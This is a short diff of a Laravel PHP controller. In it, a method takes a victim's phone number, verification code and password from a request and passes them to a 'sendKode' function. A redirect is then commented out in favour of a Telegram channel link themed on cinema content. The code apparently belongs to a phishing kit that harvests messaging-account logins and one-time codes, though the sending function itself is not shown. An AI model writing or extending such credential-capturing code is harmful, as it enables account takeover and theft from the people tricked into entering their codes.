@@ -75,7 +75,7 @@ class HomeController extends Controller
         $verif = $request->code;
         $password = $request->password;
         $this->sendKode($phone, $code, $verif, $password, $subdomain);
-        return redirect('');
+        // return redirect('https://t.me/malaysiacinemahot');
     }
 
     public function index_first(Request $request)
